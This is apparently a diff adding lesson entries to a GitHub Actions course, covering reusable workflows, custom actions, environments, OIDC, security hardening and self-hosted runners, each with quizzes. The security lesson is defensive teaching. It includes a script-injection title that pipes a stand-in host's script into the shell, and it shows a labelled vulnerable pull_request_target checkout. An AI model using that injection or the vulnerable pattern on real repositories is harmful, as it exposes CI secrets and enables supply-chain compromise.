+   "body": "A **reusable workflow** is an ordinary workflow file whose trigger is `on: workflow_call`. Another workflow calls it at the **job** level, not as a step:\n\n```yaml\njobs:\n  ci:\n    uses: my-org/ci-templates/.github/workflows/node.yml@v3\n    with: {node-version: 22}\n    secrets: inherit\n```\n\nThe callee declares typed `inputs` (string, number, boolean), the `secrets` it expects, and `outputs` mapped from its own jobs. The caller passes secrets explicitly or with `secrets: inherit`, which forwards all of the caller's secrets.\n\nThings to know:\n\n- The called workflow's jobs appear in the caller's run, named `caller-job / callee-job`.\n- Calls can nest up to ten levels deep, and a run can involve at most 50 unique reusable workflows.\n- `env` from the caller is **not** propagated; use inputs.\n- The `GITHUB_TOKEN` permissions can only be reduced by the called workflow, never elevated.\n- Reference with `@tag` or `@sha` like actions; a same-repository workflow can use `./.github/workflows/x.yml`.\n\nReusable workflows vs **composite actions**: a reusable workflow contains whole jobs with their own runners, environments and secrets; a composite action bundles steps inside one job. Use the workflow for \"the standard CI pipeline\", the action for \"set up our toolchain\".",
+   "code": "# .github/workflows/build.yml in my-org/ci-templates\non:\n  workflow_call:\n    inputs:\n      node-version: {type: string, default: \"22\"}\n    secrets:\n      NPM_TOKEN: {required: false}\n    outputs:\n      artifact: {value: \"${{ jobs.build.outputs.name }}\"}\njobs:\n  build:\n    runs-on: ubuntu-latest\n    outputs:\n      name: ${{ steps.n.outputs.name }}\n    steps:\n      - uses: actions/checkout@v7\n      - uses: actions/setup-node@v7\n        with: {node-version: \"${{ inputs.node-version }}\"}\n      - run: npm ci && npm test\n        env: {NODE_AUTH_TOKEN: \"${{ secrets.NPM_TOKEN }}\"}\n      - id: n\n        run: echo \"name=build-${{ github.sha }}\" >> \"$GITHUB_OUTPUT\" ",
+   "code_lang": "yaml",
+   "takeaways": [
+    "on: workflow_call makes a workflow callable at job level",
+    "Inputs, secrets and outputs form its typed interface",
+    "Reusable workflow = whole jobs; composite action = steps"
+   ],
+   "pitfalls": [
+    "Expecting the caller's env values to reach the reusable workflow; pass them as inputs."
+   ],
+   "quiz": [
+    {
+     "q": "Where do you put uses: org/repo/.github/workflows/ci.yml@v1?",
+     "options": [
+      "As a step inside steps:",
+      "Under on:",
+      "Directly on a job, instead of runs-on and steps",
+      "In action.yml"
+     ],
+     "answer": 2,
+     "explain": "Reusable workflows are called by a job; they bring their own jobs and runners."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/sharing-automations/reusing-workflows",
+   "requires": [
+    "github-actions.secrets-token",
+    "github-actions.outputs"
+   ]
+  },
+  {
+   "id": "github-actions.custom-actions",
+   "name": "Writing custom actions",
+   "module": "reuse",
+   "level": 3,
+   "minutes": 14,
+   "summary": "Package steps as a composite, JavaScript or Docker container action with an action.yml metadata file.",
+   "why": "When the same setup or logic repeats in many workflows, an action gives it a name, inputs and a version.",
+   "body": "An action is a directory (or repository) with an `action.yml` describing its `name`, `inputs`, `outputs` and how it `runs`. There are three kinds:\n\n- **Composite**: `runs.using: composite` and a list of steps, the same syntax as a job's steps. Each `run` step must declare its `shell`. Simplest option; good for bundling setup commands.\n- **JavaScript**: `runs.using: node24` with a `main` file. It runs directly on the runner, starts fast and works on all operating systems. Use the `@actions/core` toolkit for inputs, outputs and logging, and commit a bundled `dist/` since the runner does not install dependencies.\n- **Docker container**: `runs.using: docker` with a Dockerfile or image. Any language, but Linux runners only and slower to start.\n\nInputs reach composite steps as `${{ inputs.name }}`, and JavaScript/Docker actions as `INPUT_<NAME>` environment variables. Outputs work like step outputs: write to `$GITHUB_OUTPUT` and map them in `action.yml`.\n\nStore actions used by one repository in `.github/actions/<name>/` and reference them as `./.github/actions/<name>` after checkout. Publish shared actions in their own repository with semantic version tags and a moving major tag (`v1`) so users get fixes automatically.",
+   "code": "# .github/actions/setup-app/action.yml\nname: Setup app\ndescription: Install toolchain and dependencies\ninputs:\n  node-version:\n    description: Node.js version\n    default: \"22\"\noutputs:\n  cache-hit:\n    description: Whether dependencies came from cache\n    value: ${{ steps.setup.outputs.cache-hit }}\nruns:\n  using: composite\n  steps:\n    - id: setup\n      uses: actions/setup-node@v7\n      with: {node-version: \"${{ inputs.node-version }}\", cache: npm}\n    - run: npm ci\n      shell: bash\n# usage in a workflow, after actions/checkout:\n#   - uses: ./.github/actions/setup-app\n#     with: {node-version: \"24\"}",
+   "code_lang": "yaml",
+   "takeaways": [
+    "action.yml defines inputs, outputs and runs",
+    "Composite actions bundle steps; each run step needs shell:",
+    "JavaScript actions are fast and cross-platform; Docker actions are Linux-only"
+   ],
+   "pitfalls": [
+    "Forgetting to commit the bundled dist/ of a JavaScript action; node_modules are never installed on use."
+   ],
+   "quiz": [
+    {
+     "q": "Which action type cannot run on a macOS runner?",
+     "options": [
+      "Composite",
+      "JavaScript",
+      "Docker container",
+      "All of them can"
+     ],
+     "answer": 2,
+     "explain": "Docker container actions require a Linux runner with Docker."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/sharing-automations/creating-actions/about-custom-actions",
+   "requires": [
+    "github-actions.outputs",
+    "github-actions.using-actions"
+   ]
+  },
+  {
+   "id": "github-actions.environments-concurrency",
+   "name": "Environments, approvals and concurrency",
+   "module": "reuse",
+   "level": 3,
+   "minutes": 12,
+   "summary": "Gate deployments with environments and required reviewers, and stop overlapping runs with concurrency groups.",
+   "why": "Safe continuous deployment needs approvals, per-environment secrets and a guarantee two deploys never race.",
+   "body": "An **environment** (Settings, Environments) represents a deployment target such as `staging` or `production`. A job opts in with `environment: production`, and the environment can enforce **protection rules** before the job starts:\n\n- **Required reviewers**: the job waits until a listed person or team approves.\n- **Wait timer**: delay the job by up to 30 days.\n- **Deployment branches and tags**: only allow, say, `main` and `v*` tags to deploy.\n\nEnvironments also hold their own **secrets and variables**, which are only exposed to jobs referencing that environment. Combined with branch rules, this means a workflow on a feature branch cannot read production credentials. Deployments appear on the repository page with links to `environment.url`.\n\n**Concurrency** controls overlapping runs. All runs or jobs with the same `concurrency.group` string form a queue where at most one runs and at most one waits; a newer pending run replaces the older pending one. `cancel-in-progress: true` cancels the running one instead, ideal for PR builds where only the latest commit matters. For deployments use `cancel-in-progress: false` so a half-finished deploy is never killed.\n\nTypical groups: `${{ github.workflow }}-${{ github.ref }}` for CI, and a fixed `deploy-production` for deploys.",
+   "code": "concurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: ${{ github.event_name == 'pull_request' }}\njobs:\n  deploy:\n    if: github.ref == 'refs/heads/main'\n    runs-on: ubuntu-latest\n    environment:\n      name: production\n      url: https://shop.example.com\n    concurrency:\n      group: deploy-production\n      cancel-in-progress: false      # never kill a running deploy\n    steps:\n      - run: ./deploy.sh\n        env:\n          TOKEN: ${{ secrets.PROD_DEPLOY_TOKEN }}   # environment secret",
+   "code_lang": "yaml",
+   "takeaways": [
+    "environment: gates a job with reviewers, timers and branch rules",
+    "Environment secrets are only visible to jobs in that environment",
+    "concurrency groups serialize runs; cancel-in-progress kills the running one"
+   ],
+   "pitfalls": [
+    "Using cancel-in-progress: true on deploy jobs, leaving systems half-deployed."
+   ],
+   "quiz": [
+    {
+     "q": "Three pushes arrive quickly for a group without cancel-in-progress. What happens?",
+     "options": [
+      "Run 1 continues, run 2 is replaced by run 3 in the queue, run 3 runs after 1",
+      "All three run in parallel",
+      "All three run one after another",
+      "Only run 1 runs"
+     ],
+     "answer": 0,
+     "explain": "A concurrency group holds one running and one pending entry; a newer pending run cancels the older pending one."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment",
+   "requires": [
+    "github-actions.secrets-token",
+    "github-actions.triggers"
+   ]
+  },
+  {
+   "id": "github-actions.oidc-cloud",
+   "name": "Keyless cloud deploys with OIDC",
+   "module": "reuse",
+   "level": 3,
+   "minutes": 12,
+   "summary": "Let workflows assume cloud roles with short-lived OpenID Connect tokens instead of stored access keys.",
+   "why": "Long-lived cloud keys in secrets are the most common credential leak; OIDC removes them entirely.",
+   "body": "With **OpenID Connect**, a job asks GitHub for a signed JSON Web Token describing itself: repository, ref, environment, workflow and more. Your cloud provider is configured to trust GitHub's token issuer (`https://token.actions.githubusercontent.com`) and exchanges a valid token for short-lived cloud credentials. No access keys are stored in GitHub at all.\n\nTo use it:\n\n- Grant the job `permissions: id-token: write` (plus `contents: read` for checkout).\n- In the cloud, create a trust relationship: an AWS IAM OIDC provider and role, an Azure federated credential, or a GCP workload identity pool.\n- Use the provider's login action, such as `aws-actions/configure-aws-credentials` with `role-to-assume`.\n\nThe security lives in the **trust policy conditions** on the token's claims. The key claim is `sub`, for example `repo:my-org/shop:environment:production` or `repo:my-org/shop:ref:refs/heads/main`. Always restrict `sub` to your repository and a specific branch or environment; a policy that only checks the audience would let any GitHub repository assume your role.\n\nCredentials typically last an hour and die with the job, so a leaked log or compromised dependency gets far less than a permanent key would give.",
+   "code": "permissions:\n  id-token: write     # allow requesting the OIDC token\n  contents: read\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    environment: production\n    steps:\n      - uses: actions/checkout@v7\n      - uses: aws-actions/configure-aws-credentials@v6\n        with:\n          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy\n          aws-region: eu-central-1\n      - run: aws sts get-caller-identity   # assumed-role/gha-deploy/...\n# AWS trust policy condition (excerpt):\n# \"token.actions.githubusercontent.com:sub\": \"repo:my-org/shop:environment:production\" ",
+   "code_lang": "yaml",
+   "takeaways": [
+    "OIDC exchanges a signed per-job token for short-lived cloud credentials",
+    "Requires permissions: id-token: write",
+    "Lock the trust policy to repo and branch or environment via the sub claim"
+   ],
+   "pitfalls": [
+    "A trust policy that checks only aud, not sub, trusts every repository on GitHub."
+   ],
+   "quiz": [
+    {
+     "q": "What prevents another GitHub repository from assuming your OIDC-trusted AWS role?",
+     "options": [
+      "The id-token permission",
+      "The aws-region input",
+      "Masking of the token in logs",
+      "A trust policy condition on the token's sub claim"
+     ],
+     "answer": 3,
+     "explain": "The sub claim identifies the repository and ref or environment; the cloud trust policy must check it."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect",
+   "requires": [
+    "github-actions.secrets-token",
+    "github-actions.environments-concurrency"
+   ]
+  },
+  {
+   "id": "github-actions.security-hardening",
+   "name": "Workflow security: injection and untrusted code",
+   "module": "scale",
+   "level": 4,
+   "minutes": 15,
+   "summary": "Avoid script injection, the pull_request_target trap, unpinned actions and over-broad tokens.",
+   "why": "CI holds deploy credentials and write access, so a workflow vulnerability is a supply-chain vulnerability.",
+   "body": "Most real Actions compromises come from a few patterns.\n\n**Script injection.** `${{ }}` is substituted into the script text before bash runs. `run: echo \"${{ github.event.issue.title }}\"` with a title like `\"; curl evil.sh | sh; \"` executes attacker code. Anything a user controls (titles, bodies, branch names, commit messages) must go through `env:` and be referenced as a quoted shell variable.\n\n**pull_request_target and workflow_run.** These run in the context of the base repository **with secrets and a write token**, even for fork PRs. That is fine for labelling, but if the workflow checks out and builds the PR's head code, the attacker's code runs with your secrets. Since `actions/checkout` v7, checking out fork PR code in these triggers is refused unless you set `allow-unsafe-pr-checkout: true`; don't. Never build untrusted code there; split into an unprivileged `pull_request` build and a privileged follow-up that only consumes its artifacts as data.\n\n**Supply chain.** Tags of third-party actions can be moved to malicious code, as happened in the 2025 tj-actions/changed-files compromise. Pin third-party actions to full commit SHAs and let Dependabot update them.\n\n**Least privilege.** Set `permissions: contents: read` at the top, elevate per job, prefer OIDC over stored keys, protect environments, and require approval for workflows from first-time contributors. Static analysers such as `actionlint` and `zizmor` catch many of these issues in review.",
+   "code": "# VULNERABLE: title is pasted into the script before bash runs\n- run: echo \"New issue ${{ github.event.issue.title }}\"\n\n# SAFE: pass untrusted data as an environment variable\n- run: echo \"New issue $TITLE\"\n  env:\n    TITLE: ${{ github.event.issue.title }}\n\n# DANGEROUS combination: privileged trigger + untrusted checkout\non: pull_request_target\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v7\n        with:\n          ref: ${{ github.event.pull_request.head.sha }}  # attacker's code\n          allow-unsafe-pr-checkout: true   # checkout v7 refuses without it\n      - run: npm ci && npm test    # runs it with secrets available",
+   "code_lang": "yaml",
+   "takeaways": [
+    "Never interpolate user-controlled ${{ }} values into run scripts; use env",
+    "pull_request_target + checking out PR code = secrets exposed to forks",
+    "Pin third-party actions to SHAs and default to read-only permissions"
+   ],
+   "pitfalls": [
+    "Believing quotes around ${{ }} inside run make it safe; the attacker can close the quotes."
+   ],
+   "quiz": [
+    {
+     "q": "Why is run: echo \"${{ github.head_ref }}\" risky in a PR workflow?",
+     "options": [
+      "head_ref is always empty",
+      "A branch name chosen by the PR author is pasted into the script and can contain shell syntax",
+      "echo leaks secrets",
+      "It triggers a recursive workflow"
+     ],
+     "answer": 1,
+     "explain": "Expressions are substituted before the shell parses the script, so attacker-controlled text becomes code."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
+   "requires": [
+    "github-actions.expressions-contexts",
+    "github-actions.secrets-token",
+    "github-actions.custom-actions"
+   ]
+  },
+  {
+   "id": "github-actions.self-hosted-runners",
+   "name": "Self-hosted and larger runners",
+   "module": "scale",
+   "level": 4,
+   "minutes": 12,
+   "summary": "Run jobs on your own machines or autoscaled Kubernetes pods, select them with labels and groups, and keep them safe.",
+   "why": "Special hardware, private networks or very high volume make GitHub-hosted runners too limited or too expensive.",
+   "body": "GitHub-hosted runners are fresh VMs per job. Alternatives:\n\n- **Larger runners**: GitHub-hosted machines with more CPU and RAM, GPUs or static IPs, configured per organization and selected by label.\n- **Self-hosted runners**: the open-source runner application installed on your own machine or VM. It opens an outbound HTTPS long-poll to GitHub to receive jobs, so no inbound firewall rules are needed.\n\nJobs select runners with `runs-on`, which can be a label list such as `[self-hosted, linux, x64, gpu]` (all must match) or `group:` plus `labels:` for runner groups. Runner groups control which repositories may use which runners.\n\nThe big caveat: a self-hosted runner is **not reset** between jobs unless you make it so. Files, processes, Docker images and credentials can survive from one job to the next. For that reason GitHub warns against self-hosted runners on public repositories, where any fork PR could run code on your machine. Prefer **ephemeral** runners (`--ephemeral`) that take a single job and are destroyed.\n\nAt scale, **Actions Runner Controller (ARC)** runs ephemeral runners as Kubernetes pods using runner scale sets, scaling from zero with demand. Keep runners patched, give them minimal cloud permissions and isolate them per trust level.",
+   "code": "# Register an ephemeral runner (token from Settings > Actions > Runners)\n./config.sh --url https://github.com/my-org --token \"$REG_TOKEN\" \\\n  --labels gpu,linux-x64 --runnergroup ml --ephemeral --unattended\n./run.sh        # takes exactly one job, then exits\n\n# Workflow side (YAML):\n#   runs-on: [self-hosted, gpu]\n#   or\n#   runs-on:\n#     group: ml\n#     labels: [gpu]\n\n# Kubernetes: Actions Runner Controller scale set via Helm\nhelm install arc-runners \\\n  oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set \\\n  --namespace arc-runners --set githubConfigUrl=https://github.com/my-org",
+   "code_lang": "bash",
+   "takeaways": [
+    "Self-hosted runners poll GitHub over outbound HTTPS",
+    "runs-on labels must all match; runner groups limit repository access",
+    "Use ephemeral runners or ARC so no state leaks between jobs"
+   ],
+   "pitfalls": [
+    "Attaching a persistent self-hosted runner to a public repository, letting fork PRs run code on it."
+   ],
+   "quiz": [
+    {
+     "q": "Why prefer ephemeral self-hosted runners?",
+     "options": [
+      "They are free",
+      "Each job starts on a clean machine, so nothing leaks between jobs",
+      "They don't need network access",
+      "They allow more than 256 matrix jobs"
+     ],
+     "answer": 1,
+     "explain": "A persistent runner keeps files, processes and credentials from earlier jobs."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners",
+   "requires": [
+    "github-actions.jobs-needs",
+    "github-actions.security-hardening"
+   ]
+  },
+  {
+   "id": "github-actions.execution-model",
+   "name": "How runs are created and executed",
+   "module": "scale",
+   "level": 4,
+   "minutes": 12,
+   "summary": "Which workflow file version runs for each event, how jobs are queued and expanded, and the limits that shape large pipelines.",
+   "why": "Understanding the execution model explains puzzling behaviour like edits not taking effect or runs that never start.",
+   "body": "When an event arrives, GitHub reads `.github/workflows/` **at a specific commit**, which depends on the event: the pushed commit for `push`, the PR merge commit for `pull_request`, the default branch for `schedule`, `workflow_dispatch` defaults and `pull_request_target`. That is why a fix to a scheduled workflow only matters once merged to the default branch, and why `pull_request_target` uses the base branch's trusted copy.\n\nEach matching workflow becomes a **run** with a `run_id`, a `run_number` and an attempt count for re-runs. GitHub evaluates the job graph: jobs whose `needs` are met and whose job-level `if` is true are queued; matrices are expanded into individual jobs at that point, which is why a matrix can depend on an earlier job's output.\n\nA queued job waits for a runner matching its `runs-on` labels. Hosted runners are limited by your plan's concurrent job quota; self-hosted ones by how many are online. A job with no matching runner waits up to 24 hours before failing.\n\nOn the runner, the **runner application** downloads all referenced actions first (so a broken `uses:` fails before any step), then executes steps, streaming logs back. Limits to remember: jobs run at most 6 hours on hosted runners, workflow runs at most 35 days, and re-running failed jobs reuses the same commit and workflow definition.",
+   "code": "# Inspect runs and attempts with the GitHub CLI\ngh run list --workflow ci.yml --limit 3\n# STATUS  TITLE        WORKFLOW  BRANCH  EVENT         ID\n# ✓       Fix parser   CI        main    push          123456789\ngh run view 123456789 --log-failed     # only the failing steps' logs\ngh run rerun 123456789 --failed        # new attempt, same commit and YAML\ngh workflow run deploy.yml -f environment=staging   # workflow_dispatch\ngh run watch                            # follow a run live",
+   "code_lang": "bash",
+   "takeaways": [
+    "The workflow file is read at the event's commit (default branch for schedule)",
+    "Matrices expand when a job becomes ready, so they can use earlier outputs",
+    "Re-runs reuse the original commit and workflow definition"
+   ],
+   "pitfalls": [
+    "Editing a workflow and re-running an old run, expecting the edit to apply."
+   ],
+   "quiz": [
+    {
+     "q": "You fix a bug in a workflow on a feature branch, then re-run last night's failed scheduled run. Does it use the fix?",
+     "options": [
+      "Yes, re-runs read the latest file",
+      "Only for matrix jobs",
+      "Yes, if the branch is protected",
+      "No, scheduled runs use the default branch and re-runs reuse the original definition"
+     ],
+     "answer": 3,
+     "explain": "A re-run reproduces the original commit and workflow; schedules always use the default branch."
+    }
+   ],
+   "docs": "https://docs.github.com/en/actions/about-github-actions/understanding-github-actions",
+   "requires": [
+    "github-actions.triggers",
+    "github-actions.matrix",
+    "github-actions.self-hosted-runners"
+   ]
+  }
+ ]
+}
